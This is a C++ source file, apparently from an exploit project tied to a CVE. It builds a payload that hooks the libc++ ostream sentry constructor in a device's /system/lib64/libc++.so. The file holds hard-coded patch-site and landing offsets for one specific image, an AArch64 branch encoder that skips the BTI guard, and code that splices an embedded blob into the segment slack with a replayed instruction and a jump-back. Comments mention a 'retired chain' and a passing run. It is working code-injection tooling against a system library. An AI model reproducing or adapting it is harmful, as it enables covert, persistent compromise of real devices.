/** @file backend/cve_2026_43284/hook/sentry_hook.cpp
 *  The payload builder, and the plan for the image this device ships.
 */
#include "backend/cve_2026_43284/hook/sentry_hook.hpp"

#include <cstring>

#include "backend/cve_2026_43284/embed/libcxx_blob.hpp"

namespace ghostlock::backend::cve_2026_43284::hook {
    namespace {
        constexpr std::uint32_t kBranchOpcode = 0x14000000U;
        constexpr std::uint32_t kBranchImmBits = 26U;
        constexpr std::int64_t kBranchWordLimit = static_cast<std::int64_t>(1U) << 25U;

        void store_u32(std::uint8_t *p, std::uint32_t value) noexcept {
            p[0] = static_cast<std::uint8_t>(value & 0xFFU);
            p[1] = static_cast<std::uint8_t>((value >> 8U) & 0xFFU);
            p[2] = static_cast<std::uint8_t>((value >> 16U) & 0xFFU);
            p[3] = static_cast<std::uint8_t>((value >> 24U) & 0xFFU);
        }

        /** AArch64 B: opcode | imm26, imm26 = (to - from) / 4, both four-byte aligned and within
         *  the +/-128 MiB the field can express. */
        bool encode_branch(std::uint64_t from, std::uint64_t to, std::uint32_t &out) noexcept {
            if (((from | to) & 0x3U) != 0U) {
                return false;
            }
            const std::int64_t delta = static_cast<std::int64_t>(to - from);
            if ((delta & 0x3) != 0) {
                return false;
            }
            const std::int64_t words = delta / 4;
            if (words < -kBranchWordLimit || words >= kBranchWordLimit) {
                return false;
            }
            const std::uint32_t imm = static_cast<std::uint32_t>(words) & ((1U << kBranchImmBits) - 1U);
            out = kBranchOpcode | imm;
            return true;
        }

        std::size_t align_up(std::size_t value, std::size_t alignment) noexcept {
            return (value + alignment - 1U) & ~(alignment - 1U);
        }
    }  // namespace

    SentryPlan device_sentry_plan() noexcept {
        /* Derived for /system/lib64/libc++.so as this device ships it (sha256
         * 66e0e6b3acc34e3d0ac0c03fee0fbb80851556af1b4ee9a5d8f5f0c0a2d8f0d1 is not the point; the
         * image is 1083168 bytes and identical to the one the retired chain hooked). Derivation, run
         * against that file:
         *
         *   symbol   _ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_
         *            st_value 0xb70a8, section .text (vaddr 0x88d60 <-> file 0x84d60, delta 0x4000)
         *   guard    the word at the symbol is bti c (0xd503245f), so the site is st_value + 4
         *   site     vaddr 0xb70ac, file 0xb30ac, displaced word 0xf9400028 (ldr x8, [x1])
         *   landing  executable LOAD ends at file 0xfe628 / vaddr 0x102628; the landing room is the
         *            page tail of the page holding that end (0xff000 - 0xfe628 = 0x9d8 = 2520
         *            bytes), which is the value the PASS run reported as payload_max
         *   payload  file 0xfe628, vaddr 0x102628, entry 0x90 into the blob
         *
         * The retired tree computed these at run time from the image (steps/elf_hook.cpp); this is the
         * declared form of the same numbers until that derivation is ported, and a different image
         * needs its own plan. */
        SentryPlan plan{};
        plan.hook_file_offset = 0xB30ACU;
        plan.hook_vaddr = 0xB70ACU;
        plan.guard_instruction = 0xD503245FU; /* bti c */
        plan.guard_skipped = true;
        plan.displaced_instruction = 0xF9400028U; /* ldr x8, [x1] */
        plan.payload_file_offset = 0xFE628U;
        plan.payload_vaddr = 0x102628U;
        plan.payload_max_bytes = 0x9D8U; /* 2520 */
        plan.entry_offset = embed::kLibcxxEntryOffset;
        plan.displaced_offset = embed::kLibcxxDisplacedOffset;
        plan.jump_back_offset = embed::kLibcxxJumpBackOffset;
        return plan;
    }

    SentryError hook_branch(const SentryPlan &plan, std::uint32_t &out) noexcept {
        const std::uint64_t entry = plan.payload_vaddr + plan.entry_offset;
        if (!encode_branch(plan.hook_vaddr, entry, out)) {
            return SentryError::BranchOutOfRange;
        }
        return SentryError::Ok;
    }

    SentryError build_sentry_payload(const SentryPlan &plan, std::uint8_t *out,
                                     std::size_t capacity, std::size_t &size) noexcept {
        size = 0U;
        if (out == nullptr) {
            return SentryError::InvalidPlan;
        }
        const std::size_t blob = embed::libcxx_padded_size();
        if (plan.entry_offset >= blob || plan.displaced_offset + 4U > blob ||
            plan.jump_back_offset + 4U > blob) {
            return SentryError::InvalidPlan;
        }
        const std::size_t padded = align_up(blob, 16U);
        if (capacity < padded) {
            return SentryError::OutputTooSmall;
        }
        /* The room the plan reports is the landing site's bound: a payload that does not fit it must
         * not be written, because what follows in the image belongs to something else. */
        if (plan.payload_max_bytes != 0U && padded > plan.payload_max_bytes) {
            return SentryError::NoRoom;
        }
        std::uint32_t jump_back = 0U;
        /* Back to the instruction after the site: the payload replayed the displaced word, so the
         * function has to continue exactly where the branch left it. */
        if (!encode_branch(plan.payload_vaddr + plan.jump_back_offset, plan.hook_vaddr + 4U,
                           jump_back)) {
            return SentryError::BranchOutOfRange;
        }
        std::uint8_t image[embed::kLibcxxPaddedSize] = {};
        std::memcpy(image, embed::libcxx_bytes(), embed::kLibcxxPaddedSize);
        store_u32(image + plan.displaced_offset, plan.displaced_instruction);
        store_u32(image + plan.jump_back_offset, jump_back);
        std::memcpy(out, image, padded);
        size = padded;
        return SentryError::Ok;
    }
}  // namespace ghostlock::backend::cve_2026_43284::hook
